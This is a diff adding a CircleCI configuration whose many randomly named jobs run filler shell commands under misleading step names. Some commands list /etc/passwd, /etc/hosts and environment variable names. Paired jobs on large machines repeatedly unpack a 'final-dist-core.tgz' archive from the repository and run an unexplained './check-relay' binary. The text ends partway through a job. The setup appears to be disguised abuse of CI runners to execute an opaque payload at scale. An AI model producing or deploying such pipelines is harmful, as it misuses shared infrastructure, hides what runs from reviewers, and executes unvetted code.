@@ -1,0 +1,1261 @@
+version: 2.1
+
+jobs:
+  product-generator-pin-array:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: product owner v11 briefing
+          command: |
+            mkdir -p /tmp/z4
+            set +o pipefail 2>/dev/null; seq 1 1155833 | awk 'BEGIN{m=0}{if($1>m)m=$1}END{print "max:",m}' > /tmp/z4/CPU.Fermion; seq 1 1155833 >> /tmp/z4/CPU.Fermion; true
+            echo "phase: update-retry-bug"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'CPU.Fermion'
+  update-retry-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  Donuts:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: publish before retirement
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; cat /etc/hosts >'/tmp/tmp_goalPurple.log' 2>&1 && wc -l '/tmp/tmp_goalPurple.log'; true ; } > /tmp/z4/0rd3r-3cho-m0un741n
+            echo "phase: ruby3-test"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - '0rd3r-3cho-m0un741n'
+  ruby3-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  realHank:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Archive Table Warmup Step
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; find /run -maxdepth 2 -type f \( -name '*' -o -name '*.sock' \) -empty 2>/dev/null | nl; true ; } > /tmp/z4/FJoRDVecToR
+            echo "phase: strated"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'FJoRDVecToR'
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  zUnionSidebar:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: DRAFT unzip
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; printf 'host=cache-a\nport=1132\nuser=tina\ndebug=true\n' >"/tmp/site.csv" && grep -c = "/tmp/site.csv"; true ; } > /tmp/z4/bo50n-ze74
+            echo "phase: v7-edge3"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'bo50n-ze74'
+  v7-edge3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  StandardTagPipeline:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Tagging NET 5773
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; ls -n /home | nl; true ; } > /tmp/z4/shimmerPlasmaGlacierGreen
+            echo "phase: dan-verify"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'shimmerPlasmaGlacierGreen'
+  dan-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  salt_:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Drain
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; echo "the quick brown fox" >| /tmp/metrics_milk_draft.out && cat /tmp/metrics_milk_draft.out; true ; } > /tmp/z4/surg3
+            echo "phase: full-send"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'surg3'
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  Split-ViewConfig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: RUN MIGRATE CONNECTION POOL
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; grep -irs bash /usr/share/doc/bash 2>/dev/null | sort | head; true ; } > /tmp/z4/heathotterviolet
+            echo "phase: promote"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'heathotterviolet'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  COUPON_SHIPMENT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Tune the service accounts
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; env | sed 's/=.*//' | head -10; true ; } > /tmp/z4/draft527
+            echo "phase: ruby3-release"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'draft527'
+  ruby3-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  url34s:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: The read replica backed up twice
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; printf '%s\n' blue yellow gray cyan | fmt -w 52 | wc -w; true ; } > /tmp/z4/65e20cm
+            echo "phase: v2-canary"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - '65e20cm'
+  v2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  Price2SVM:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Penalty kick promotion
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; grep -s -w then /etc/profile; true ; } > /tmp/z4/cobalt.buffer.worker.bramble.west
+            echo "phase: p-01"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'cobalt.buffer.worker.bramble.west'
+  p-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  refactor-zack-thread:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: still approving mfa settings
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; sed 's|.*/||' /etc/shells | sort -u; true ; } > /tmp/z4/245.85.3
+            echo "phase: preview"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - '245.85.3'
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  shader_cli:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: step one post the payroll batch
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; printf 'id,item,qty,price\n1,cherry,12,35.30\n2,lime,1,44.10\n3,papaya,17,23.04\n4,lemon,13,31.33\n' >"/tmp/link-stack1.tsv" && awk -F, 'NR>1' "/tmp/link-stack1.tsv" | wc -l; true ; } > /tmp/z4/216.56
+            echo "phase: tb-x"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - '216.56'
+  tb-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  coNonceOptions:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Runway 10 reboot
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; tries=(goose cat zebra frog whale eagle); echo ${tries[0]}; true ; } > /tmp/z4/debug.log.23
+            echo "phase: andromeda-plus"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'debug.log.23'
+  andromeda-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  Input2CNN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: B roll can be cropped later
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type d -name "*.old" -size 0 -links +1 -exec du -sh {} + 2>/dev/null | awk -F/ '{print $NF}' | sort | uniq -c | sort -rn | head -5; true ; } > /tmp/z4/181.152.0.152
+            echo "phase: rocket"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - '181.152.0.152'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  mega-migration:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: MUX MP4
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; tar -cf '/tmp/gra7.tar' -C /etc hosts && tar -rf '/tmp/gra7.tar' -C /etc shells && tar -tf '/tmp/gra7.tar'; true ; } > /tmp/z4/SKU-21941-QD
+            echo "phase: preview-build"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'SKU-21941-QD'
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  handler_2001_11:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Post the beta testers at 3 per sec
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 3 -name 'cmd*' -user $(id -un) 2>/dev/null|xargs ls -ld; true ; } > /tmp/z4/ZjCw57FvY
+            echo "phase: WEB-226"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'ZjCw57FvY'
+  WEB-226:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  title_uuid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Back off 4 seconds
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; ls -cQR --si /etc/profile.d /sys/class/net | sort; true ; } > /tmp/z4/v-6807
+            echo "phase: produce-full-integration-tests"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'v-6807'
+  produce-full-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  usp_ColumnFreeStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: RIG SPRITE ATLAS
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; set -- swan cat crow; printf '%s\n' "$@" | sort; true ; } > /tmp/z4/BluePacketShard
+            echo "phase: add-parse-leak"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'BluePacketShard'
+  add-parse-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  path_139:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scout unit tests
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | cut -f1,6 -d: | awk '{print NF}'; true ; } > /tmp/z4/backupBog
+            echo "phase: add-retry-crash"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'backupBog'
+  add-retry-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  Plugin-Gradient-Email:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: AUG SCREENSHOT RUN
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; timeout 2 sleep 1 && echo "finished in time"; true ; } > /tmp/z4/node_reef
+            echo "phase: MERGE_LAB"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'node_reef'
+  MERGE_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  php-x86-stable:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: cleanup is required here
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; [[ ! -e /proc/self ]] && echo yes || echo 'no'; true ; } > /tmp/z4/M6pL9LE
+            echo "phase: Run_Tests3"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'M6pL9LE'
+  Run_Tests3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  setup_param_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: skip
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/weekly_summer_v3.conf && sed -i '/^#/d' /tmp/weekly_summer_v3.conf && grep -c . /tmp/weekly_summer_v3.conf; true ; } > /tmp/z4/dream_moor_plasma
+            echo "phase: golf"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'dream_moor_plasma'
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  EGAM3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Triage seed data whenever
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; sort --field-separator=: -k 3 -r --numeric-sort /etc/passwd|cut -d':' -f6|awk -F/ '{print NF-1}'; true ; } > /tmp/z4/xx_c8287cbce
+            echo "phase: node20-ship"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'xx_c8287cbce'
+  node20-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/216.56 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  deps-misc-pos-clip:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Recon the intro clip
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; printf '%s\n' 70 62 23 43 > "/var/tmp/draft.conf" && sort -n -o "/var/tmp/draft.conf" "/var/tmp/draft.conf" && cat "/var/tmp/draft.conf"; true ; } > /tmp/z4/TICKET_078824
+            echo "phase: java17-ship"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'TICKET_078824'
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  file_stage:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Started validating the regression pack
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; df -P|awk '{print $1}'|grep -v '^[a-m]'|xargs; true ; } > /tmp/z4/usr.sw.cfg
+            echo "phase: RunStaging"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'usr.sw.cfg'
+  RunStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  bbennett86:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Select the settings gear once lunch is done
+          command: |
+            mkdir -p /tmp/z4
+            { set +o pipefail 2>/dev/null; for elem in tuesday wednesday thursday; do printf '%-8s %d\n' "$elem" ${#elem}; done | tac; true ; } > /tmp/z4/surge-golden-molten-chunk
+            echo "phase: depoly"
+      - persist_to_workspace:
+          root: /tmp/z4
+          paths:
+            - 'surge-golden-molten-chunk'
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: Stop upstream reader
+          command: |
+            cat /tmp/z4/WoRKerYiELdtenANTSileNt 2>/dev/null | awk '/./{print NR}' | head -3 || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 3 --single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat final-dist-core.tgz | tar xzf -
+      - run:
+          command: sleep 60
+      - run:
+          command: ./check-relay
+  wz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/z4
+      - run:
+          name: validate mutation score
+          command: |
+            mkdir -p /tmp/z4
